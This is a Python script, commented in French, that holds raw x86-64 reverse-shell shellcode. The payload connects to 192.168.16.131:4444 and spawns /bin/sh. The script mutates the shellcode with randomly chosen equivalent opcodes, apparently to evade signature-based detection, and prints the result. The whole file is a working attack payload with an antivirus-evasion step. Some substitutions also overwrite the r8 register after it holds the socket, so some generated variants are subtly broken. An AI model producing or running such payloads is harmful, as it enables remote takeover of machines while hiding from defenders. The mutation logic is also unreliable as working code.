import random

# Fonction contenant des opcodes et des équivalences, on fait un choix random parmi la liste
def random_opcodes(shellcode):
    opcodes_list = {
        b'\x48\x31\xc0': [b'\x48\x31\xc0', b'\x4d\x31\xc0\x4c\x89\xc0'],
        b'\x48\x31\xdb': [b'\x48\x31\xdb', b'\x4d\x31\xc0\x4c\x89\xc3'],
        b'\x48\x31\xc9': [b'\x48\x31\xc9', b'\x4d\x31\xc0\x4c\x89\xc1'],
        b'\x48\x31\xd2': [b'\x48\x31\xd2', b'\x4d\x31\xc0\x4c\x89\xc2'],
        b'\x48\x31\xf6': [b'\x48\x31\xf6', b'\x4d\x31\xc0\x4c\x89\xc6'],
    }

    shellcode_bytes = bytearray(shellcode)

    i = 0
    while i < len(shellcode_bytes):
        for instr, equivalents in opcodes_list.items():
            if shellcode_bytes[i:i+len(instr)] == instr:
                equivalent = random.choice(equivalents)
                shellcode_bytes[i:i+len(instr)] = equivalent
                i += len(instr)
                break
        else:
            i += 1

    return bytes(shellcode_bytes)

# Shellcode original du reverse code source asm
reverse_shellcode = b'\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xff\x48\x31\xf6\xb0\x29\x40\xb7\x02\x40\xb6\x01\xb2\x06\x0f\x05\x49\x89\xc0\x48\x83\xec\x08\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\xc0\xa8\x10\x83\x48\x89\xe6\xb2\x10\x41\x50\x5f\xb0\x2a\x0f\x05\xb0\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05\xb0\x21\x41\x50\x5f\x40\xb6\x01\x0f\x05\xb0\x21\x41\x50\x5f\x40\xb6\x02\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'

# Générer le shellcode métamormorphique
metamorphic_shellcode = random_opcodes(reverse_shellcode)

# Remettre au format bytes
def format_bytes(shellcode):
    return ''.join(f"\\x{byte:02x}" for byte in shellcode)

# Print du shellcode métamorphique en bytes
print("Metamorphic Shellcode:")
print(format_bytes(metamorphic_shellcode))
